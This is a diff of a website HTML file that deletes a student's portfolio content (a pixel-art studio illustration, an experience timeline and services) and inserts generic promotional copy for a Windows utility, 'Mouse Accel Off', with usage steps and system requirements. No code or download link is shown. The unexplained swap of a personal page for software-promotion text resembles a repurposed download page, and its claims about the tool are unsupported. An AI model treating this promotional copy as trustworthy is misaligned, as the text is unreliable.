-                <path d="M82 43h24M190 27h22M272 99h28M421 122h18M40 204h21M106 240h16" stroke="#d8d6c8" stroke-width=".7" opacity=".65"/>
-                <path d="M68 267 60 298M121 267 119 298M181 267l2 31M242 267l7 31M303 267l13 31M365 267l18 31M422 267l23 25M34 279h423M40 290h407" fill="none" stroke="#b9ad96" stroke-width=".7"/>
-                <path d="M43 286h29M133 273h25M214 294h33M276 284h20M387 292h30" stroke="#ece1c8" stroke-width=".8"/>
-              </g>
-              <g class="about-room-light" fill="#fbf1d3">
-                <path d="M44 82 165 157l143 106H186z"/>
-                <path d="M186 267h122l46 31H207z"/>
-                <path d="M44 109 105 157l97 106h-28z" opacity=".55"/>
-              </g>
-              <g class="about-studio-window">
-                <path d="M37 31h140v145H37z" fill="#263b3a" opacity=".12"/>
-                <path d="M36 28h138v142H36z" fill="#79968f"/>
-                <path d="M44 36h122v126H44z" fill="#c6dfdf"/>
-                <g class="about-outdoor-cloud" fill="#edf0e4"><path d="M58 52h9v-3h10v3h11v4H58zM119 71h7v-3h12v3h13v3h-32z"/></g>
-                <path d="M44 136 71 121l27 9 29-24 39 16v40H44z" fill="#a1beba"/>
-                <g fill="#7caaa8" shape-rendering="crispEdges"><path d="M49 114h13v36H49zM67 107h15v43H67zM86 123h13v27H86zM116 115h17v35h-17zM139 119h21v31h-21z"/><path d="M70 103h9v4h-9zM72 98h2v5h-2z"/></g>
-                <g fill="#e3e4cc" opacity=".65"><path d="M52 119h2v3h-2zM57 119h2v3h-2zM70 113h3v3h-3zM77 113h2v3h-2zM70 123h3v3h-3zM89 129h3v3h-3zM120 121h3v3h-3zM127 121h3v3h-3zM143 126h4v3h-4zM153 135h3v3h-3z"/></g>
-                <path d="M44 151h19v-8h7v-6h14v7h10v6h15v-8h12v-7h11v10h16v5h18v12H44z" fill="#568c88"/>
-                <path d="M44 36h20l79 126h-19zM117 36h9l40 65v14z" fill="#f6f4e8" opacity=".24"/>
-                <path d="M36 28h138l-8 8H44zM36 28l8 8v126l-8 8z" fill="#aec6ba"/>
-                <path d="M105 36v126M44 100h122" stroke="#91aaa0" stroke-width="4"/>
-                <path d="M102 36v126M44 98h122" stroke="#d2ded0" stroke-width="1.5"/>
-                <path d="M32 169h146v6H32z" fill="#a49270"/><path d="M32 169h146v2H32z" fill="#d7c3a0"/>
-                <path d="M41 175h126l8 4H45z" fill="#263b3a" opacity=".12"/>
-              </g>
-              <g class="about-wall-studies">
-                <path d="M196 39h39v37h-39z" fill="#273c3b" opacity=".09"/>
-                <path d="M194 37h39v37h-39z" fill="#ad9575"/><path d="M197 40h33v31h-33z" fill="#f2ecdc"/>
-                <path d="M203 63 211 49l8 14z" fill="#478582"/><circle cx="220" cy="49" r="5" fill="#ba583a"/>
-                <path d="M202 66h22" stroke="#d4c3a6"/>
-                <circle cx="276" cy="52" r="13" fill="#273c3b" opacity=".08"/>
-                <circle cx="275" cy="50" r="13" fill="#8c9c91"/><circle cx="275" cy="50" r="11" fill="#f3edde"/>
-                <path d="M275 40v2M275 58v2M265 50h2M283 50h2M275 44v6l-5 3" fill="none" stroke="#516960" stroke-width="1.2"/>
-              </g>
-              <g class="about-studio-shelf" shape-rendering="crispEdges">
-                <path d="M311 54h132v8H311z" fill="#273c3b" opacity=".1"/>
-                <path d="M308 51h134v5H308z" fill="#a78a66"/><path d="M308 51h134v1H308z" fill="#dcc39b"/>
-                <path d="M319 56h3v12h-3zM426 56h3v12h-3z" fill="#718277"/>
-                <path d="M316 26h9v25h-9z" fill="#b94d35"/><path d="M327 20h11v31h-11z" fill="#428486"/><path d="M340 29h8v22h-8z" fill="#c7ac7e"/>
-                <path d="M318 30h5v1h-5zM329 24h7v1h-7zM329 45h7v1h-7zM342 33h4v1h-4z" fill="#e6d9b7"/>
-                <path d="M352 26l6-2 9 26-6 1z" fill="#5b756c"/><path d="M356 30l4-1 1 3-4 1z" fill="#d2c7ad"/>
-                <path d="M399 38h25l-3 13h-19z" fill="#b96b49"/><path d="M399 38h25v3h-25z" fill="#d69061"/>
-                <path d="M411 38V21M411 29l-8-5M411 27l8-8" fill="none" stroke="#507c61" stroke-width="2"/>
-                <path d="M400 17h8v9h-5v-3h-3zM416 12h9v8h-9zM408 15h6v10h-6z" fill="#578e6f"/>
-                <path d="M417 13h6v2h-6zM400 18h5v2h-5z" fill="#84aa85"/>
-              </g>
-              <g class="about-desk-shadows" fill="#283b35"><path d="M232 241h8l17 39h-15zM430 241h7l16 39h-14z" opacity=".1"/><ellipse cx="355" cy="280" rx="26" ry="2" opacity=".12"/></g>
-              <g class="about-studio-stool"><path d="M341 260h28v5h-28z" fill="#a88961"/><path d="M341 260h28v1h-28z" fill="#d6bd95"/><path d="M345 265h4l-2 14h-4zM363 265h4l2 14h-4z" fill="#61766b"/><path d="M347 274h18v2h-18z" fill="#819084"/></g>
-              <g class="about-board-support" fill="#988365"><path d="M277 225h4v8h-4zM373 224h4v9h-4zM254 230h143v3H254z"/><path d="M254 230h143v1H254z" fill="#d4bf98"/></g>
-              <g class="about-task-lamp">
-                <path class="about-task-light" d="M421 194 390 232h55l-16-38z" fill="#f5dfa1"/>
-                <path d="M429 232h17v-3h-7v-21l-12-17" fill="none" stroke="#576e62" stroke-width="3"/>
-                <circle cx="437" cy="208" r="3" fill="#a6ae95"/>
-                <path d="M418 183h10l6 12h-24z" fill="#587c71"/><path d="M411 195h23v2h-23z" fill="#b7baa0"/>
-                <path d="M414 195h17v1h-17z" fill="#f2d69b"/>
-              </g>
-              <g class="about-studio-desk">
-                <path d="M218 232h230v8H218z" fill="#a98a60"/><path d="M218 232h230v2H218z" fill="#dac29a"/>
-                <path d="M218 238h230v3H218z" fill="#8b7658"/>
-                <path d="M230 241h8v38h-8zM430 241h8v38h-8zM237 247h194v3H237z" fill="#4d6960"/>
-                <path d="M230 242h2v36h-2zM430 242h2v36h-2z" fill="#799384"/>
-                <path d="M230 279h10v1h-10zM429 279h11v1h-11z" fill="#374c43"/>
-                <path d="M223 236h25M289 235h42M349 236h37M405 235h33" stroke="#c1a374" stroke-width=".6"/>
-              </g>
-              <path d="M242 226h40v5h-40z" fill="#e2d7bd"/><path d="M245 227h31M245 229h31" stroke="#f3eddb" stroke-width=".7"/>
-              <g class="about-desk-pencil" fill="#152c3e" shape-rendering="crispEdges"><path d="M269 228h14v2h-14z"/><path d="M269 228h3v2h-3z" fill="#c77954"/></g>
-              <g class="about-studio-tools"><path d="M401 215h12v17h-12z" fill="#637d6a"/><path d="M403 219h8v11h-8z" fill="#83937b"/><path d="M403 215v-13M407 215v-16M411 215v-11" stroke="#ac8863" stroke-width="2"/><path d="M408 199h-2v-4h2z" fill="#3b5d52"/>
-                <path d="M386 223h12v8h-12zM398 225h4v4h-4z" fill="#f2ead5"/><path d="M387 224h10" stroke="#d0bc96" stroke-width="1"/>
-                <path class="about-cup-steam" d="M389 219v-3l2-2v-3M394 220v-3l2-2v-3" fill="none" stroke="#71877a" stroke-width=".8"/>
-              </g>
-              <g class="about-floor-plant">
-                <ellipse cx="53" cy="280" rx="19" ry="2" fill="#283b35" opacity=".13"/>
-                <path d="M39 254h28l-4 25H43z" fill="#ba7050"/><path d="M58 255h9l-4 24h-7z" fill="#a65d44"/><path d="M37 251h32v5H37z" fill="#d28d66"/>
-                <path d="M41 253h24" stroke="#73573c" stroke-width="2"/>
-                <path d="M53 251v-38M53 235l-15-12M53 229l13-16M53 223l-7-16" fill="none" stroke="#4f775d" stroke-width="2"/>
-                <path d="M32 215h11v9H32zM61 204h12v10H61zM41 200h9v13h-9zM50 207h10v12H50z" fill="#4d896b" shape-rendering="crispEdges"/>
-                <path d="M32 215h9v2h-9zM63 204h10v2H63zM42 200h7v2h-7z" fill="#7aa481"/>
-              </g>
-              <g class="about-maker-shadow" fill="#293c35"><ellipse cx="181" cy="281" rx="35" ry="3" opacity=".09"/><ellipse cx="181" cy="280" rx="26" ry="1.2" opacity=".22"/></g>
-            </svg>
-            <svg class="about-maker" viewBox="0 0 48 72" aria-hidden="true" focusable="false" shape-rendering="crispEdges" data-character="straw-hat" data-expression="pleased" data-gesture="double-thumbs">
-              <g class="about-maker-shift" transform="translate(0.0000 0.0000)">
-                <g class="about-thought-bubble">
-                  <path d="M31-18h12v2h3v13h-3v2H31v-2h-3v-13h3z" fill="#f5f0dc" stroke="#597582" stroke-width=".8"/>
-                  <path d="M33-14h7v1h2v5h-2v2h-2v2h-3v-3h2v-2h2v-3h-4v1h-2zM35-3h3v2h-3z" fill="#152c3e"/>
-                  <path d="M30 2h2v2h-2zM28 5h1v1h-1z" fill="#f5f0dc"/>
-                </g>
-                <g class="about-maker-leg--back" transform="translate(18.9344 45.2878) rotate(-9.6448)">
-                  <path d="M-3-1h6v12h-6z" fill="#246292"/><path d="M-3 1h1v8h-1z" fill="#4787ad"/>
-                  <path d="M-3 9h6v2h-6z" fill="#eee6c9"/><path d="M-2 11h4v2h-4z" fill="#dba071"/>
-                  <g class="about-maker-shin--back" transform="translate(0 11) rotate(18.1625)">
-                    <path d="M-2-1h4v14h-4z" fill="#dba071"/><path d="M-2 1h1v9h-1z" fill="#be8058"/>
-                    <g class="about-maker-foot--back" transform="translate(0 12) rotate(-8.5177)"><path d="M-3-1h6v2h-6zM3 0h3v1H3z" fill="#dba071"/><path d="M-4 1H6v1H-4z" fill="#d5ae62"/><path d="M-4 2H6v1H-4zM-1-1h1v2h-1zM0 0h3v1H0z" fill="#644831"/><circle class="about-foot-contact" cx="0" cy="0" r=".01" fill="none"/></g>
-                  </g>
-                </g>
-                <g class="about-maker-leg--front" transform="translate(28.9329 45.1133) rotate(-6.1090)">
-                  <path d="M-3-1h6v12h-6z" fill="#327bad"/><path d="M1 1h2v8H1z" fill="#5898bb"/>
-                  <path d="M-3 9h6v2h-6z" fill="#f6efd7"/><path d="M-2 11h4v2h-4z" fill="#edb98b"/>
-                  <g class="about-maker-shin--front" transform="translate(0 11) rotate(11.3855)">
-                    <path d="M-2-1h4v14h-4z" fill="#edb98b"/><path d="M-2 1h1v9h-1z" fill="#dba071"/>
-                    <g class="about-maker-foot--front" transform="translate(0 12) rotate(-5.2765)"><path d="M-3-1h6v2h-6zM3 0h4v1H3z" fill="#edb98b"/><path d="M-4 1H7v1H-4z" fill="#e2bf75"/><path d="M-4 2H7v1H-4zM-1-1h1v2h-1zM0 0h3v1H0z" fill="#644831"/><path d="M4 0h1v1H4zM6 0h1v1H6z" fill="#dba071"/><circle class="about-foot-contact" cx="0" cy="0" r=".01" fill="none"/></g>
-                  </g>
-                </g>
-                <g class="about-maker-body" transform="rotate(-1.0000 24 49)">
-                  <path d="M18 30h12v19H18z" fill="#edb98b"/>
-                  <path d="M20 26h9v7h-9zM21 33h8v13h-8z" fill="#edb98b"/><path d="M20 27h9v3h-9zM21 34h2v2h-2zM27 34h2v2h-2zM23 45h1v1h-1z" fill="#dba071"/>
-                  <g class="about-maker-vest"><path d="M16 30h5v3h1v16h-7V34h-1v-2h2zM29 30h3v2h2v3h-1v14h-6V34h2z" fill="#ce3d30"/>
-                  <path d="M17 31h2v15h-2zM30 33h2v12h-2z" fill="#ee6242"/><path d="M20 35h2v14h-2zM27 36h1v13h-1z" fill="#9f2e29"/><path d="M20 37h1v1h-1zM20 43h1v1h-1z" fill="#f4d174"/></g>
-                  <g class="about-maker-head">
-                    <g class="about-maker-face" transform="translate(24 28) scale(.92) translate(-24 -28)">
-                    <path d="M16 12h18v12h-2v3h-2v2H20v-2h-2v-3h-2zM14 18h3v5h-3zM34 19h1v2h-1z" fill="#edb98b"/>
-                    <path d="M17 15h2v11h-2zM20 27h10v2H20zM14 20h2v2h-2zM33 21h2v1h-2z" fill="#dba071"/>
-                    <g class="about-maker-hair" fill="#19272e"><path d="M14 10h20v4h-2v2h-2v-3h-3v2h-2v-2h-3v3h-3v-1h-1v6h-3v-4h-1zM32 13h3v4h-2v-2h-1z"/></g>
-                    <g class="about-maker-straw-hat"><path d="M16 3h15v1h3v2h2v4h-24V6h2V4h2zM9 10h30v1h2v2h-2v1H11v-1H8v-2h1z" fill="#dfb767"/>
-                    <path d="M16 4h15v1H16zM14 5h2v2h-2zM12 11h26v1H12z" fill="#f2d48d"/><path d="M12 8h24v2H12z" fill="#c93d30"/><path d="M12 9h24v1H12zM11 13h28v1H11z" fill="#aa713e"/>
-                    <path d="M18 5h1v2h-1zM23 4h1v3h-1zM28 5h1v2h-1zM33 6h1v1h-1zM10 11h1v1h-1zM20 12h1v1h-1zM30 11h1v1h-1zM37 12h1v1h-1z" fill="#c7974c"/></g>
-                    <g class="about-maker-brows"><path d="M22 15h4v1h-4zM29 15h4v1h-4z" fill="#19272e"/></g>
-                    <g class="about-maker-eyes"><path d="M22 17h4v4h-4zM29 17h4v4h-4z" fill="#fff3dd"/><g class="about-maker-gaze"><path d="M24 17h2v4h-2zM31 17h2v4h-2z" fill="#19272e"/></g></g>
-                    <g class="about-maker-lids"><path d="M22 17h4v4h-4zM29 17h4v4h-4z" fill="#edb98b"/><path d="M22 20h4v1h-4zM29 20h4v1h-4z" fill="#754732"/></g>
-                    <g class="about-maker-happy-eyes" fill="#19272e"><path d="M22 18h4v1h-4zM21 19h1v1h-1zM26 19h1v1h-1zM29 18h4v1h-4zM28 19h1v1h-1zM33 19h1v1h-1z"/></g>
-                    <path class="about-maker-scar" d="M29 22h4v.8h-4zM30 21.5h.7v1.8H30zM32 21.5h.7v1.8H32z" fill="#9c6145"/>
-                    <path d="M33 21h1v1h-1z" fill="#dba071"/>
-                    <g class="about-expression about-expression--curious"><path d="M28 24h4v3h-4z" fill="#754732"/><path d="M29 25h2v1h-2z" fill="#f4d3ab"/></g>
-                    <g class="about-expression about-expression--focused"><path d="M26 25h7v1h-7zM32 24h1v1h-1z" fill="#754732"/><path d="M27 26h4v1h-4z" fill="#dba071"/></g>
-                    <g class="about-expression about-expression--pleased"><path d="M21 23h13v2h-1v1h-1v1h-8v-1h-2v-1h-1z" fill="#754732"/><path d="M22 23h11v2H22zM24 25h7v1h-7z" fill="#fff3dd"/><path d="M23 23h9v.5h-9z" fill="#f4d3ab"/></g>
-                    </g>
-                  </g>
-                  <g class="about-maker-arm--back" transform="translate(15.0000 32.0000) rotate(24.1440)">
-                    <path d="M-2-1h4v14h-4z" fill="#dba071"/><path d="M-2 0h1v10h-1z" fill="#be8058"/>
-                    <g class="about-maker-forearm--back" transform="translate(0 12) rotate(150.6367)"><path d="M-2-1h4v14h-4z" fill="#dba071"/><path d="M-2 1h1v9h-1z" fill="#be8058"/>
-                      <g class="about-maker-hand--back" transform="translate(0 12) rotate(-173.7807)">
-                        <g class="about-hand-normal"><path d="M-3-2h6v5h-6zM3-1h1v3H3z" fill="#dba071"/><path d="M-3 2h5v1h-5z" fill="#be8058"/></g>
-                        <g class="about-hand-approval"><path d="M-3-1h6v5h-6zM-4-7h3v7h-3z" fill="#dba071"/><path d="M-3 3h6v1h-6zM-1 0h1v3h-1zM0 0h3v1H0zM0 2h3v1H0z" fill="#be8058"/><path d="M-3-6h1v2h-1z" fill="#edb98b"/></g>
-                      </g>
-                    </g>
-                  </g>
-                  <g class="about-maker-arm--front" transform="translate(31.0000 32.0000) rotate(-28.4496)">
-                    <path d="M-2-1h4v15h-4z" fill="#edb98b"/><path d="M-2 0h1v11h-1z" fill="#dba071"/>
-                    <g class="about-maker-forearm--front" transform="translate(0 13) rotate(-134.5220)"><path d="M-2-1h4v15h-4z" fill="#edb98b"/><path d="M-2 1h1v10h-1z" fill="#dba071"/>
-                      <g class="about-maker-hand--front" transform="translate(0 13) rotate(163.9716)">
-                        <g class="about-hand-normal"><path d="M-3-2h6v5h-6zM3-1h1v3H3z" fill="#edb98b"/><path d="M-3 2h5v1h-5z" fill="#dba071"/></g>
-                        <g class="about-hand-approval"><path d="M-3-1h6v5h-6zM1-7h3v7H1z" fill="#edb98b"/><path d="M-3 3h6v1h-6zM0 0h1v3H0zM-3 0h3v1h-3zM-3 2h3v1h-3z" fill="#dba071"/><path d="M2-6h1v2H2z" fill="#f4d3ab"/></g>
-                        <g class="about-maker-pencil" transform="rotate(0.0000)"><path d="M0-1h7v2H0z" fill="#c77954"/><path d="M5-1h2v2H5zM7 0h2v1H7z" fill="#152c3e"/></g>
-                        <circle class="about-maker-grip" cx="0" cy="0" r=".01" fill="none"/>
-                      </g>
-                    </g>
-                  </g>
-                </g>
-              </g>
-            </svg>
-            <span class="about-loose-sheet" aria-hidden="true"><i></i><i></i><i></i></span>
-            <div class="about-study-board" aria-hidden="true">
-              <svg class="about-study-drawing" viewBox="0 0 132 116" focusable="false">
-                <defs><clipPath id="aboutArtMask" clipPathUnits="userSpaceOnUse"><rect class="about-art-mask" x="0" y="0" width="132" height="116"/></clipPath></defs>
-                <g class="about-board-material">
-                  <path d="M0 0h132v116H0z" fill="#b59a73"/><path d="M1 1h130v2H1zM1 1h2v113H1z" fill="#d4bc94"/><path d="M129 3h2v112H3v-2h126z" fill="#947d5e"/>
-                  <path d="M5 5h122v105H5z" fill="#f5f0df"/>
-                  <path d="M9 17h7M86 11h11M111 32h7M62 47h12M10 89h8M67 102h11M108 82h9" stroke="#ded4b9" stroke-width=".45" opacity=".75"/>
-                  <path d="M9 5h18v3H9zM105 5h18v3h-18z" fill="#d6bd8d"/>
-                  <circle cx="2" cy="2" r=".6" fill="#736855"/><circle cx="130" cy="2" r=".6" fill="#736855"/>
-                </g>
-                <g class="about-finished-art" clip-path="url(#aboutArtMask)">
-                  <text x="15" y="24" fill="#597582" font-family="monospace" font-size="7.5" letter-spacing=".6">THE DIRECTION</text>
-                  <g fill="#e5e5d5"><rect x="10" y="32" width="35" height="16" rx="2"/><rect x="47" y="32" width="30" height="16" rx="2"/><rect x="81" y="32" width="40" height="16" rx="2"/></g>
-                  <path d="M28 51v5h37M62 51v5M101 51v5H65v5" fill="none" stroke="#8ba097" stroke-width=".8"/>
-                  <text x="14" y="77" fill="#152c3e" font-family="sans-serif" font-size="17" font-weight="700">Kinetix</text>
-                  <text x="14" y="91" fill="#304b5a" font-family="sans-serif" font-size="8">A clearer</text>
-                  <text x="14" y="102" fill="#304b5a" font-family="sans-serif" font-size="8">experience.</text>
-                  <path d="M78 95h6v8h-6zM87 89h6v14h-6zM96 83h6v20h-6z" fill="#43888c"/>
-                  <path d="M105 75h6v28h-6z" fill="#a83e1d"/>
-                  <path d="M76 105h39" stroke="#8ba097" stroke-width=".8"/>
-                </g>
-                <g class="about-sketch" fill="none" stroke="#304b5a" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round">
-                  <g class="about-brainstorm-prompt" opacity=".28" stroke="#597582"><path d="M14 20h41M14 28h26M14 36h34"/><path d="M95 22c0-8 13-8 13 0 0 5-7 5-7 10m0 5v1"/></g>
-                  <!-- The same handwritten notes survive and converge into the goal. -->
-                  <g class="about-brainstorm-note" data-note="clear" data-x="14" data-y="60" data-goal-x="16" data-goal-y="36" transform="translate(2 -24)">
-                    <polyline class="about-writing-stroke" points="18,62 17,61 15,61 14,63 14,66 15,67 17,67 18,66" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="20,60 20,67 23,67" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="26,64 30,64 30,62 29,61 27,61 26,63 26,66 27,67 29,67 30,66" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="36,62 35,61 33,61 32,63 32,66 33,67 35,67 36,65 36,61 36,67" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="38,67 38,61 38,64 40,61 42,61" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                  </g>
-                  <g class="about-brainstorm-link" stroke="#a83e1d"><polyline class="about-writing-stroke" points="28,70 28,75 26,73 28,75 30,73" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/></g>
-                  <g class="about-brainstorm-note" data-note="bold" data-x="16" data-y="79" data-goal-x="52" data-goal-y="36" transform="translate(36 -43)">
-                    <polyline class="about-writing-stroke" points="16,79 16,86 16,82 18,80 20,81 20,84 19,86 17,86 16,85" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="24,80 22,81 22,85 24,86 26,85 26,81 24,80" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="28,79 28,86 31,86" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="38,79 38,86 38,82 36,80 34,81 34,85 36,86 38,85" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                  </g>
-                  <g class="about-brainstorm-link" stroke="#a83e1d"><polyline class="about-writing-stroke" points="28,89 28,95 26,93 28,95 30,93" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/></g>
-                  <g class="about-brainstorm-note" data-note="useful" data-x="12" data-y="99" data-goal-x="85" data-goal-y="36" transform="translate(73 -63)">
-                    <polyline class="about-writing-stroke" points="12,100 12,105 13,106 15,106 16,104 16,100 16,106" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="22,101 21,100 19,100 18,101 18,102 21,103 22,104 22,105 21,106 19,106 18,105" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="24,103 28,103 28,101 27,100 25,100 24,102 24,105 25,106 27,106 28,105" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="33,99 31,99 31,106" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="30,102 33,102" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="36,100 36,105 37,106 39,106 40,104 40,100 40,106" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                    <polyline class="about-writing-stroke" points="42,99 42,106 45,106" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/>
-                  </g>
-                  <g class="about-brainstorm-link" stroke="#43888c"><polyline class="about-writing-stroke" points="10,108 48,108 51,105 51,97 48,95 12,95 9,98" pathLength="1" stroke-dasharray="1" stroke-dashoffset="0" opacity="1"/></g>
-                </g>
-              </svg>
-            </div>
-            </div>
-          </div>
-          <div class="about-scene-notation" aria-hidden="true"><span class="about-scene-number">03 / 03</span><span class="about-scene-name">Resolve</span><span class="about-film-progress"></span></div>
-          <figcaption id="aboutAtelierCaption">The first question became a clickable dashboard study.</figcaption>
-          <div class="about-scene-controls" role="group" aria-label="Explore the studio story" hidden>
-            <button type="button" data-scene-index="0" aria-controls="aboutObserve" aria-pressed="false"><span>01</span>Observe</button>
-            <button type="button" data-scene-index="1" aria-controls="aboutCompose" aria-pressed="false"><span>02</span>Compose</button>
-            <button type="button" data-scene-index="2" aria-controls="aboutResolve" aria-pressed="true"><span>03</span>Resolve</button>
-            <span class="about-scroll-cue" aria-hidden="true">Follow the story<span></span></span>
-          </div>
-          <p class="about-scene-status" role="status" aria-live="polite"></p>
-        </figure>
-      </div>
-    </section>
+<h2>🖱️ How to Use Mouse Accel Off</h2>
+<p>Using Mouse Accel Off is straightforward. After you launch the application, you will see a clear indicator showing whether Enhanced Pointer Precision is currently on or off. Follow these steps:</p>
+<ol>
+<li>Open Mouse Accel Off from the location where you saved it.</li>
+<li>Look at the status display to see the current setting for Enhanced Pointer Precision.</li>
+<li>Click the toggle button to turn the setting off or on, depending on your preference.</li>
+<li>The change takes effect immediately. You can move your mouse to feel the difference.</li>
+<li>Close the application when you are done. The setting remains as you left it.</li>
+</ol>
+<p>There is no need to restart your computer or log out. The utility communicates directly with the Windows setting and applies the change instantly.</p>
 
-    <section class="experience section-space" id="experience" aria-labelledby="experienceTitle">
-      <div class="page-width">
-        <div class="section-heading section-heading--split reveal">
-          <h2 id="experienceTitle">Where I have worked.</h2>
-          <p>An internship in telecom analytics, three semesters of teaching, and a game I am building on my own.</p>
-        </div>
-        <ol class="timeline" role="list">
-          <li class="timeline-row reveal">
-            <figure class="timeline-photo"><div class="media-frame"><img src="assets/experience/telkomsel.webp" width="1152" height="720" alt="Final internship presentation with the Telkomsel team, in front of a screen reading Telkomsel Regular Internship Program" loading="lazy" decoding="async"></div><figcaption>Final presentation, Telkomsel</figcaption></figure>
-            <div class="timeline-body"><span class="timeline-period">Jul – Sep 2025</span><div class="timeline-role"><h3>Market &amp; Demand Analysis Intern</h3><span class="timeline-org">Telkomsel · Fixed Broadband Business · South Jakarta</span></div><p class="timeline-detail">Reviewed fixed-broadband demand with field surveyors, cleaned and matched report data in Excel (XLOOKUP, INDEX-MATCH), and built a monitoring dashboard that kept field reports tied to their real-time status.</p></div>
-          </li>
-          <li class="timeline-row reveal">
-            <figure class="timeline-photo"><div class="media-frame"><img src="assets/experience/teaching-lab.webp" width="656" height="410" alt="Students working at computers during a practicum session in the Informatics Laboratory" loading="lazy" decoding="async"></div><figcaption>Practicum session, Informatics Lab</figcaption></figure>
-            <div class="timeline-body"><span class="timeline-period">Feb 2025 – Jul 2026</span><div class="timeline-role"><h3>Teaching Assistant</h3><span class="timeline-org">Informatics Laboratory · Telkom University</span></div><p class="timeline-detail">Three semesters across Artificial Intelligence Fundamentals and Object-Oriented Programming: practicum sessions, debugging help, module preparation, and project mentoring for student groups. OOP tutor in the final semester.<span class="timeline-tag">3 lab certificates</span></p></div>
-          </li>
-          <li class="timeline-row reveal">
-            <figure class="timeline-photo"><div class="media-frame"><img src="assets/experience/archipelago.webp" width="1200" height="750" alt="3D render of the Archipelago Pet Collector world: snowy, grassy, cloud, and desert islands linked by bridges" loading="lazy" decoding="async"></div><figcaption>In-studio render of the game world</figcaption></figure>
-            <div class="timeline-body"><span class="timeline-period">Sep 2026 – now</span><div class="timeline-role"><h3>Independent Game Developer</h3><span class="timeline-org">Archipelago Pet Collector · on Roblox</span></div><p class="timeline-detail">A creature-collecting game set in a fantasy Nusantara, built with a human–AI workflow in Blender and Roblox Studio: 7 regions, 38 rigs, 284 animations, and 29 creatures with 9 NPCs in Luau, kept honest by 67 audit checks and 39 regression tests.</p></div>
-          </li>
-          <li class="timeline-row reveal">
-            <figure class="timeline-photo"><div class="media-frame"><img src="assets/experience/community.webp" width="640" height="400" alt="The Informatics for Community team with the supervising lecturer beside the seminar banner" loading="lazy" decoding="async"></div><figcaption>The team and supervising lecturer</figcaption></figure>
-            <div class="timeline-body"><span class="timeline-period">Mar – Jun 2025</span><div class="timeline-role"><h3>Team Lead &amp; Speaker</h3><span class="timeline-org">Informatics for Community · Telkom University</span></div><p class="timeline-detail">Led a team of five to teach AI fundamentals and digital ethics to 22 grade-seven students at a Bandung junior high school, from needs analysis and budget to analysing participant feedback.</p></div>
-          </li>
-        </ol>
-        <div class="beyond reveal">
-          <figure class="beyond-photo"><div class="media-frame"><img src="assets/experience/nihon-no-matsuri.webp" width="545" height="341" alt="Members carrying the portable shrine during the Omikoshi parade at Nihon no Matsuri 15" loading="lazy" decoding="async"></div><figcaption>Omikoshi parade, Nihon no Matsuri 15</figcaption></figure>
-          <div class="beyond-body"><span class="profile-label">Beyond class</span>
-          <ul class="beyond-list" role="list">
-            <li><strong>Nihon no Matsuri 15</strong><span>Staff, Nov 2023 – Jun 2024: weekly fundraising sales and timekeeper for the maid café at the main event.</span></li>
-            <li><strong>GDSC Telkom University</strong><span>Member, 2023 – 2024: community challenges and talks with 35+ active participants.</span></li>
-            <li><strong>Forestry cyber security study group</strong><span>Member, 2025: exploring security challenges in forest data management at a new campus lab.</span></li>
-            <li><strong>Short-form video editor</strong><span>TikTok <a href="https://www.tiktok.com/@superrm4x" data-profile-link="tiktok">@superrm4x</a> since 2021: anime and Formula 1 edits, 1.6K followers and 127K likes; one edit passed 321K views.</span></li>
-          </ul></div>
-        </div>
-      </div>
-    </section>
+<h2>💻 System Requirements</h2>
+<div class="card">
+<ul>
+<li><strong>Operating system:</strong> Windows 10 or Windows 11 (64-bit recommended).</li>
+<li><strong>Processor:</strong> 1 GHz or faster.</li>
+<li><strong>Memory:</strong> 2 GB RAM or more.</li>
+<li><strong>Storage:</strong> 50 MB free space for the application.</li>
+<li><strong>Display:</strong> Standard monitor with at least 1024×768 resolution.</li>
+<li><strong>Input device:</strong> A standard mouse or touchpad.</li>
+<li><strong>Permissions:</strong> Standard user account; administrator rights may be required to change system settings.</li>
+</ul>
+</div>
+<p>These requirements are typical for small desktop utilities. Mouse Accel Off is designed to run smoothly on most modern Windows computers without consuming significant resources.</p>
 
-    <section class="services section-space" id="services" aria-labelledby="servicesTitle">
-      <div class="page-width services-layout">
-        <div class="section-heading services-heading reveal">
-          <h2 id="servicesTitle">What I bring.</h2>
-          <p>Questions in, decisions out — with the numbers shown.</p>
-        </div>
-        <div class="service-list">
-          <a class="service-row reveal" href="case-kinetix.html" aria-label="Data analysis and dashboards — see the Kinetix case study">
-            <span class="service-number">01 / ANALYSE</span>
-            <div class="service-heading"><h3>Data analysis &amp; dashboards</h3><span class="service-meta">Excel · Python · R · Looker Studio</span></div>
-            <span class="service-scene service-scene--design" aria-hidden="true"><span class="service-workbench"><i></i><i></i><i></i><i></i></span><span class="service-pixel-sign"></span><img class="service-specialist" src="assets/specialist-design.png" width="32" height="40" alt="" decoding="async"></span>
-            <p class="service-description">Clean, match, and explain operational data.</p>
